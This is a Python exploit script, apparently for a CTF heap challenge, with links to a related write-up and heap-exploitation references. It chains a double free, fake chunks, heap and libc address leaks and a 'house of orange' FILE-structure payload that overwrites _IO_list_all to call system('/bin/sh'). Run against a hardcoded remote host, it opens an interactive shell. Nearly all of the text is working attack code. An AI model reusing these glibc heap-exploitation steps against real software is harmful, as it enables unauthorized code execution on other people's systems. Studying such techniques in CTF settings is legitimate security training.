import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def _alloc(index,content,line=True):
    read_until(f, "choice:")
    f.write("1\n")
    read_until(f, "Index:")
    f.write(index+"\n")
    read_until(f, "Content:")
    if line:
        f.write(content+"\n")
    else:
        f.write(content)

def _show(index):
    read_until(f, "choice:")
    f.write("2\n")
    read_until(f, "Index:")
    f.write(index+"\n")

def _free(index):
    read_until(f, "choice:")
    f.write("3\n")
    read_until(f, "Index:")
    f.write(index+"\n")

def main():
    libc_start_got = 0x000000602050
    free_got = 0x000000602018
    stdout_addr = 0x555555756020
    stdout_addr = 0x555555756005

    ## leak heap addr
    _alloc("0","A"*64+p(0)+p(0x61),line=False)
    _alloc("1","B"*72+p(0x61),line=False)
    _alloc("2","C"*8+p(0)*2+p(0x61)+p(0)*5+p(0x61),line=False)
    _alloc("3","D"*72+p(0x61),line=False)
    _alloc("8","E"*8)
    _free("1")
    _free("0")
    _show("0")

    heap_addr = u(f.read(6)+"\x00"*2)-0x60
    print "heap addr: %s" % hex(heap_addr)

    ## leak libc base addr
    _free("1") # double free of 1
    _alloc("4",p(heap_addr+0x50)) # change the fd to fake chunk
    _alloc("5","qqqqqqqq")
    _alloc("5","qqqqqqqq")
    _alloc("6",p(0)+p(0xb1)) # fake chunk allocated. Overwrite the size of next chunk.
    _free("4")
    _show("1")

    libc_addr = u(f.read(6)+"\x00"*2)-0x3c27b8
    print "libc addr: %s" % hex(libc_addr)

    ## Calculate one gadget rce address 
    one_rce = libc_addr + one_rce_offset
    print "one_rce: %s" % hex(one_rce)
    ## Calculate system address 
    system = libc_addr + system_offset
    ## Calculate _IO_list_all address 
    io_list_all = libc_addr + io_list_all_offset

    ## Create fake vtable
    _free("8")
    _alloc("8",p(system)*8)

    ## set the vtable entry of fake filestructure to point to the vtable that was just created
    _free("3")
    _alloc("3",p(0)+p(heap_addr+0x190))
 
    ## The house of orange payload
    _free("6")
    _alloc("6",("/bin/sh\x00"+     # file structure start
            p(0xb1)+          # size of next chunk
            p(0)+             # fd of unsortedbin chunk = 0
            p(io_list_all-16)+  # bk = _IO_list_all
            p(0)+             # _IO_write_ptr
            p(0x61)).ljust(0x50,'\x00'),line=False) # _IO_write_base

    ## Null out the chain field of the fake structure
    _free("2")
    _free("0")
    _free("2")
 
    _alloc("2",p(heap_addr+0x80)+p(0)*8+p(0),line=False)
    _alloc("0","qqqqqqqq",line=False)
    _alloc("2",p(0)+p(0)*8+p(0),line=False)
    _alloc("9",p(0)+p(0)*8+p(0),line=False)
 
    ## set the chain in action
    read_until(f, "choice:")
    f.write("1\n")
    read_until(f, "Index:")
    f.write("0\n")
 

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("178.62.40.102", 6001)
        libc_start_offset = 0x0000000000020740
        #one_rce_offset = 0x4526a
        one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        io_list_all_offset = 0x00000000003c31a0
        system_offset = 0x0000000000046590
        main()
    else:
        s, f = sock("localhost", 6001)
        libc_start_offset = 0x0000000000021e50
        libc_stdout_offset = 0x00000000003c3870
        #one_rce_offset = 0x4647c
        one_rce_offset = 0xe93e5
        #one_rce_offset = 0xea33d
        io_list_all_offset = 0x00000000003c31a0
        system_offset = 0x0000000000046590
        main()
'''
https://amritabi0s.wordpress.com/2018/05/01/asis-ctf-quals-2018-fifty-dollors-write-up/
http://angelboy.tw/
https://github.com/shellphish/how2heap/blob/master/house_of_orange.c
http://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
'''
